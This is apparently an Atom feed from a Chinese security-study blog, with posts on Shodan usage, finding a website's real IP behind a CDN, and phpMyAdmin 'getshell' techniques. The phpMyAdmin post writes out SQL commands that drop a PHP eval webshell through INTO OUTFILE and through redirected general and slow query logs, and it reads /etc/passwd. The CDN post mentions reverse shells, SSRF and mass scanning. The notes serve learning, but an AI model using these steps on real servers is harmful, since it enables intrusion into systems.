<h2 id="命令行">命令行</h2>
<p>安装</p>
<pre><code>pip install shodan
</code></pre>
<p>初始化</p>
<pre><code>shodan init [api_key]
</code></pre>
<p><code>api_key</code>注册后就会分配，在账户中进行查看</p>
<h3 id="语法说明">语法说明</h3>
<pre><code>shodan -h
</code></pre>
<pre><code>Usage: shodan [OPTIONS] COMMAND [ARGS]...

Options:
  -h, --help  Show this message and exit.

Commands:
  alert       Manage the network alerts for your account
  convert     Convert the given input data file into a different format.
  count       Returns the number of results for a search
  data        Bulk data access to Shodan
  domain      View all available information for a domain
  download    Download search results and save them in a compressed JSON...
  honeyscore  Check whether the IP is a honeypot or not.
  host        View all available information for an IP address
  info        Shows general information about your account
  init        Initialize the Shodan command-line
  myip        Print your external IP address
  org         Manage your organization's access to Shodan
  parse       Extract information out of compressed JSON files.
  radar       Real-Time Map of some results as Shodan finds them.
  scan        Scan an IP/ netblock using Shodan.
  search      Search the Shodan database
  stats       Provide summary information about a search query
  stream      Stream data in real-time.
  version     Print version of this tool.
</code></pre>
<h3 id="search查找">search查找</h3>
<p>直接将查询结果展示在命令行中，默认情况下只显示IP、端口号、主机名和HTTP数据</p>
<pre><code>shodan search microsoft iis 6.0
</code></pre>
<pre><code>shodan search --fields ip_str,port,org,hostnames microsoft iis 6.0
</code></pre>
<p>内容多的话就敲回车慢慢看，似乎有更简便的方法，但是不会（</p>
<p>不想看了，退出按q即可</p>
<h3 id="host信息">host信息</h3>
<p>查找host的相关信息</p>
<pre><code>shodan host 52.47.198.62
</code></pre>
<p>感觉不太准，有的端口无法被扫描出来</p>
<h2 id="python代码">python代码</h2>
<p>示例</p>
<pre><code>import shodan  # 导入shodan库

api = shodan.Shodan(&quot;xxxxxxxxxxx&quot;)  # 指定API_KEY,返回句柄
try:
    results = api.search('apache')  # 搜索apache，返回 JSON格式的数据
    print(results)
    print(&quot;Results found:%s&quot; % results['total'])
    for result in results['matches']:
        print(result['ip_str'])  # 打印出ip地址
except shodan.APIError as e:
    # print(&quot;Error:%s&quot; % e)
    pass
</code></pre>
<p>小tips</p>
<p>查看自身外部可见ip</p>
<pre><code>shodan myip
</code></pre>
<p>查看是否为蜜罐</p>
<pre><code>shodan honeyscore xx.xx.xx.xx
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[绕过CDN查找真实IP]]></title>
        <id>https://Morn-zh.github.io/post/rao-guo-cdn-cha-zhao-zhen-shi-ip/</id>
        <link href="https://Morn-zh.github.io/post/rao-guo-cdn-cha-zhao-zhen-shi-ip/">
        </link>
        <updated>2021-05-09T14:52:26.000Z</updated>
        <content type="html"><![CDATA[<h1 id="绕过cdn查找真实ip">绕过CDN查找真实IP</h1>
<p>CDN的全称是 Content Delivery Network，即内容分发网络</p>
<p>开启CDN后，网站会根据用户所处的位置，让用户访问邻近的CND服务器，避免直接访问主站，减少网站服务器宽带资源,降低服务器压力。</p>
<p>所以会出现，不同地区ping百度,不同地区得到的反馈ip不一样的情形。</p>
<p>（我可以理解是镜像吗？</p>
<h2 id="验证是否使用cdn">验证是否使用CDN</h2>
<h3 id="使用多地ping服务">使用多地ping服务</h3>
<pre><code>http://ping.chinaz.com/
http://ping.aizhan.com/
http://ce.cloud.360.cn/
https://www.17ce.com/
</code></pre>
<h3 id="使用nslookup检测">使用nslookup检测</h3>
<p>如果返回域名解析对应多个 IP 地址多半是使用了 CDN。</p>
<figure data-type="image" tabindex="1"><img src="https://Morn-zh.github.io/post-images/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP/Snipaste_2021-05-07_21-41-45.png" alt="Snipaste_2021-05-07_21-41-45" loading="lazy"></figure>
<h2 id="如何绕过cdn找到目标站点真实ip">如何绕过CDN找到目标站点真实IP？</h2>
<h3 id="让服务器主动连接我们">让服务器主动连接我们</h3>
<p>方法有</p>
<ul>
<li>让它发邮件给我们，我们查看邮件源代码，可以看到目标IP</li>
<li>RSS邮件订阅（？</li>
<li>利用网站漏洞：比如有代码执行漏洞、SSRF、存储型的XSS都可以让服务器主动访问我们预设的web服务器，那么就能在日志里面看见目标网站服务器的真实IP。</li>
</ul>
<h3 id="查询dns历史记录">查询DNS历史记录</h3>
<p>查询网站</p>
<p>微步社区 https://x.threatbook.cn/（允许的查询次数少）</p>
<p>ipip整合不同的地区的信息：https://tools.ipip.net/cdn.php</p>
<p>国外的查询网站：</p>
<p>http://toolbar.netcraft.com/site_report?url=</p>
<p>https://viewdns.info/</p>
<p>https://securitytrails.com/（推荐）</p>
<h3 id="查询子域名">查询子域名</h3>
<p>通过子站点（可能没有CDN），查询对应IP，从而辅助查找目标真实IP</p>
<p>使用子域名扫描器、谷歌搜索都可</p>
<h3 id="网络空间搜索引擎">网络空间搜索引擎</h3>
<p>1、钟馗之眼：https://www.zoomeye.org/</p>
<p>2、Shodan：https://www.shodan.io/</p>
<p>3、FOFA：https://fofa.so/</p>
<h3 id="通过ssl证书">通过SSL证书</h3>
<blockquote>
<p>摘自：https://www.hackliu.com/?p=448</p>
</blockquote>
<p>假如你在xyz123boot.com上托管了一个服务，原始服务器IP是136.23.63.44。 而CloudFlare则会为你提供DDoS保护，Web应用程序防火墙和其他一些安全服务，以保护你的服务免受攻击。为此，你的Web服务器就必须支持SSL并具有证书，此时CloudFlare与你的服务器之间的通信，就像你和CloudFlare之间的通信一样，会被加密（即没有灵活的SSL存在）。</p>
<blockquote>
<p><strong>Cloudflare</strong>（<a href="https://zh.wikipedia.org/wiki/%E7%BA%BD%E7%BA%A6%E8%AF%81%E5%88%B8%E4%BA%A4%E6%98%93%E6%89%80">NYSE</a>：<a href="http://www.nyse.com/quote/XNYS:NET">NET</a>）是一家总部位于<a href="https://zh.wikipedia.org/wiki/%E8%88%8A%E9%87%91%E5%B1%B1">旧金山</a>的<a href="https://zh.wikipedia.org/wiki/%E7%BE%8E%E5%9C%8B">美国</a>跨国科技企业，以向客户提供基于<a href="https://zh.wikipedia.org/wiki/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86">反向代理</a>的<a href="https://zh.wikipedia.org/wiki/%E5%85%A7%E5%AE%B9%E5%82%B3%E9%81%9E%E7%B6%B2%E8%B7%AF">内容分发网络</a>（Content Delivery Network, CDN）及<a href="https://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F">分布式域名解析服务</a>（Distributed Domain Name Server）为主要业务。</p>
</blockquote>
<p>这看起来很安全，但问题是，当你在端口443（https://136.23.63.44:443）上直接连接到IP时，SSL证书就会被暴露。</p>
<p>此时，如果攻击者扫描0.0.0.0/0，即整个互联网，他们就可以在端口443上获取在xyz123boot.com上的有效证书，进而获取提供给你的Web服务器IP。</p>
<blockquote>
<p>Censys：https://censys.io/</p>
</blockquote>
<p>目前Censys工具就能实现对整个互联网的扫描，Censys是一款用以搜索联网设备信息的新型搜索引擎，安全专家可以使用它来评估他们实现方案的安全性，而黑客则可以使用它作为前期侦查攻击目标、收集目标信息的强大利器。</p>
<p>Censys搜索引擎能够扫描整个互联网，Censys每天都会扫描IPv4地址空间，以搜索所有联网设备并收集相关的信息，并返回一份有关资源（如设备、网站和证书）配置和部署信息的总体报告。</p>
<p>而攻击者唯一需要做的就是把上面用文字描述的搜索词翻译成实际的搜索查询参数。</p>
<p>xyz123boot.com证书的搜索查询参数为：parsed.names：xyz123boot.com</p>
<p>只显示有效证书的查询参数为：tags.raw：trusted</p>
<p>攻击者可以在Censys上实现多个参数的组合，这可以通过使用简单的布尔逻辑来完成。</p>
<p>组合后的搜索参数为：parsed.names: xyz123boot.com and tags.raw: trusted</p>
<figure data-type="image" tabindex="2"><img src="https://Morn-zh.github.io/post-images/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP/1559276469987432.png" alt="1058583-20181009230838766-860479177.png" loading="lazy"></figure>
<p>Censys将向你显示符合上述搜索条件的所有标准证书，以上这些证书是在扫描中找到的。</p>
<p>要逐个查看这些搜索结果，攻击者可以通过单击右侧的“Explore”，打开包含多个工具的下拉菜单。What's using this certificate? &gt; IPv4 Hosts</p>
<figure data-type="image" tabindex="3"><img src="https://Morn-zh.github.io/post-images/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP/1559276494363607.png" alt="1058583-20181009230838766-860479177.png" loading="lazy"></figure>
<p>此时，攻击者将看到一个使用特定证书的IPv4主机列表，而真实原始 IP就藏在其中。</p>
<figure data-type="image" tabindex="4"><img src="https://Morn-zh.github.io/post-images/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP/1559276514702250.png" alt="1058583-20181009230838766-860479177.png" loading="lazy"></figure>
<p>你可以通过导航到端口443上的IP来验证，看它是否重定向到xyz123boot.com，或它是否直接在IP上显示网站？</p>
<p>使用给定的SSL证书</p>
<p>如果你是执法部门的人员，想要找出一个隐藏在cheesecp5vaogohv.onion下的儿童色情网站。做好的办法，就是找到其原始IP，这样你就可以追踪到其托管的服务器，甚至查到背后的运营商以及金融线索。</p>
<p>隐藏服务具有SSL证书，要查找它使用的IPv4主机，只需将&quot;SHA1 fingerprint&quot;（签名证书的sha1值）粘贴到Censys IPv4主机搜索中，即可找到证书，使用此方法可以轻松找到配置错误的Web服务器。</p>
<blockquote>
<p>这里有个疑问，既然在网上有办法找到签名证书的sha1，也能对应到某个IP，是不是每个人都是裸奔上网？</p>
</blockquote>
<h3 id="检索header信息">检索header信息</h3>
<p>借助SecurityTrails这样的平台，任何人都可以在茫茫的大数据搜索到自己的目标，甚至可以通过比较HTTP标头来查找到原始服务器。</p>
<p>特别是当用户拥有一个非常特别的服务器名称与软件名称时，攻击者找到你就变得更容易。</p>
<p>如果要搜索的数据相当多，如上所述，攻击者可以在Censys上组合搜索参数。假设你正在与1500个Web服务器共享你的服务器HTTP标头，这些服务器都发送的是相同的标头参数和值的组合。而且你还使用新的PHP框架发送唯一的HTTP标头（例如：X-Generated-Via：XYZ框架），目前约有400名网站管理员使用了该框架。而最终由三个服务器组成的交集，只需手动操作就可以找到了IP，整个过程只需要几秒钟。</p>
<p>例如，Censys上用于匹配服务器标头的搜索参数是80.http.get.headers.server :</p>
<p>查找由CloudFlare提供服务的网站的参数如下：</p>
<p>80.http.get.headers.server:cloudflare</p>
<figure data-type="image" tabindex="5"><img src="https://Morn-zh.github.io/post-images/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP/1559276536427745.png" alt="1058583-20181009230838766-860479177.png" loading="lazy"></figure>
<h3 id="利用响应中信息">利用响应中信息</h3>
<p>浏览网站源代码，寻找独特的代码片段。在JavaScript中使用具有访问或标识符参数的第三方服务（例如Google Analytics，reCAPTCHA）是攻击者经常使用的方法。</p>
<p>以下是从HackTheBox网站获取的Google Analytics跟踪代码示例：</p>
<p>ga（'create'，'UA-93577176-1'，'auto'）;<br>
可以使用80.http.get.body：参数通过body/source过滤Censys数据，不幸的是，正常的搜索字段有局限性，但你可以在Censys请求研究访问权限，该权限允许你通过Google BigQuery进行更强大的查询。</p>
<p>Shodan是一种类似于Censys的服务，也提供了http.html搜索参数。</p>
<p>搜索示例：https://www.shodan.io/search?query=http.html%3AUA-32023260-1</p>
<figure data-type="image" tabindex="6"><img src="https://Morn-zh.github.io/post-images/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP/1559276559939859.png" alt="1058583-20181009230838766-860479177.png" loading="lazy"></figure>
<p>在JS⽂件中寻找敏感接⼝：</p>
<blockquote>
<p>https://github.com/Threezh1/JSFinder</p>
<p>https://github.com/GerbenJavado/LinkFinder</p>
</blockquote>
<h3 id="使用国外主机解析域名">使用国外主机解析域名</h3>
<p>国内很多 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实IP。</p>
<h3 id=""></h3>
<h3 id="网站漏洞查找">网站漏洞查找</h3>
<p>1）目标敏感文件泄露，例如：phpinfo之类的探针、GitHub信息泄露等。<br>
2）XSS盲打，命令执行反弹shell，SSRF等。<br>
3）无论是用社工还是其他手段，拿到了目标网站管理员在CDN的账号，从而在从CDN的配置中找到网站的真实IP。</p>
<h3 id="用-zmap-扫全网">用 Zmap 扫全网</h3>
<p>（未实践</p>
<pre><code>wget http://www.ipdeny.com/ipblocks/data/countries/hk.zone #香港IP 
zmap -w hk.zone -p 80 -B 100M -o hk.res
./zgrab -input-file=hk.res -senders=2000 -data-&quot;./http-reg&quot; | grep -E 'memberlogin' &gt;&gt; x.txt
</code></pre>
<pre><code>wget -c http://ftp.apnic.net/stats/apnic/delegated-apnic-latest #全网IP,天朝好像扫不到
</code></pre>
<h3 id="-2"></h3>
<h3 id="f5-ltm解码法">F5 LTM解码法</h3>
<p>（看不懂</p>
<p>当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取，例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000，先把第一小节的十进制数即487098378取出来，然后将其转为十六进制数1d08880a，接着从后至前，以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就是最后的真实ip。</p>
<p>（难道是通过某种类型的cookie中暴露的信息得出IP</p>
<p>https://www.fujieace.com/penetration-test/cdn-find-ip.html</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[信息收集]]></title>
        <id>https://Morn-zh.github.io/post/xin-xi-shou-ji/</id>
        <link href="https://Morn-zh.github.io/post/xin-xi-shou-ji/">
        </link>
        <updated>2021-05-06T12:47:52.000Z</updated>
        <content type="html"><![CDATA[<p>挖坑中。。。</p>
<h1 id="shodan">Shodan</h1>
<h1 id="oneforall">oneforall</h1>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[phpMyAdmin随记]]></title>
        <id>https://Morn-zh.github.io/post/phpmyadmin-sui-ji/</id>
        <link href="https://Morn-zh.github.io/post/phpmyadmin-sui-ji/">
        </link>
        <updated>2021-04-29T14:08:46.000Z</updated>
        <content type="html"><![CDATA[<p>版本：phpMyAdmin4.8.5</p>
<p>查阅版本信息：</p>
<p>http://localhost/phpMyAdmin4.8.5/README<br>
http://localhost/phpMyAdmin4.8.5/changelog.php</p>
<h1 id="常规getshell">常规getshell</h1>
<p>1.可以看看网站是否存在注入利用注入出来的账号密码登录（x<br>
2.使用phpmyadmin爆破工具进行爆破进入后台（x</p>
<p>查找物理路径</p>
<p>phpinfo.php</p>
<pre><code>select @@basedir;
</code></pre>
<pre><code>web绝对路径：在可读写的前提下如何获取web路径？

(1) phpinfo() 页面：最理想的情况，直接显示web路径

(2) web报错信息：可以通过各种fuzz尝试让目标报错，也有可能爆出绝对路径

(3) 一些集成的web框架：如果目标站点是利用phpstudy、LAMPP等之类搭建的，可以通过查看数据库路径show variables like '%datadir%'; ，再猜解web路径的方法，一般容易成功。

(4) 利用select load_file() 读取文件找到web路径：可以尝试/etc/passwd，apache|nginx|httpd log之类的文件。

Trick：如何判断目录是否存在，往往确定了/var/www/html目录，但是还有一层目录不能确定，可以采用目标域名+常用的网站根目录的方式进行爆破，当使用select 'test' into outfile '/var/www/$fuzz$/shell.php';时目录$fuzz$不存在将会报错Can't create/write to file '/var/www/html/.666.txt' (Errcode: 2)；如果存在但是目录写不进去将返回(Errcode: 13)；如果使用的load data infile &quot;/etc/passwd&quot; into table test;该语句执行后将也会显示文件是否存在，有权限能否写等信息。

</code></pre>
<p>查看写入权限</p>
<pre><code>show variables like '%secure%'
</code></pre>
<pre><code>select 'test' into outfile '/var/www/webxxx/shell.php'
</code></pre>
<h1 id="日志getshell">日志getshell</h1>
<h2 id="写入日志文件getshell">写入日志文件getshell</h2>
<p>查看日志设置</p>
<pre><code>show variables like 'general_log%'
</code></pre>
<pre><code>第一步手动开启日志。
set global  general_log='on'   //首先设置为on
第二步 修改日志路径
set global  general_log_file =&quot;d:\\phpstudy\\www\\a.php&quot;
然后 查看是否开启成功
show variables like &quot;general_log%&quot;
</code></pre>
<pre><code>然后只要执行的语句都会写入到日志文件中，所以我们查询语句
select '&lt;?php eval($_POST['a']);?&gt;'
虽然报错但已经写进去了
</code></pre>
<h2 id="慢查询写入webshell">慢查询写入webshell</h2>
<p>查询配置</p>
<pre><code>show variables like '%slow%';
</code></pre>
<p>配置路径</p>
<pre><code>set GLOBAL slow_query_log_file='C:/phpStudy/PHPTutorial/WWW/slow.php';
</code></pre>
<p>开启</p>
<pre><code>set GLOBAL slow_query_log=on;
</code></pre>
<p>写入日志</p>
<pre><code>select '&lt;?php phpinfo();?&gt;' from mysql.db where sleep(10);
</code></pre>
<p>参考文章：</p>
<p>https://www.cnblogs.com/xhcbj/p/13356580.html</p>
]]></content>
    </entry>
</feed>